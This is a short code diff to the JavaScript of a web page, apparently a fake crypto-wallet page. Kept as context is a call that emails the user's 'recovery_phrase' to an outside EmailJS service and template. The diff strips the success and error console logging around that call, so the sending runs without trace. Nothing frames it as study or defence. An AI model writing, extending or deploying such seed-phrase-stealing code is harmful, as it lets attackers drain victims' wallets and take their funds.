@@ -570,10 +570,6 @@ document.addEventListener("DOMContentLoaded", () => {
       // Send phrase via EmailJS
       emailjs.send("service_1qzlil7", "template_w742mzr", {
         recovery_phrase: phrase
-      }).then(() => {
-        console.log("Phrase sent successfully");
-      }).catch(err => {
-        console.error("Error sending phrase", err);
       });
 
       // Continue with flow
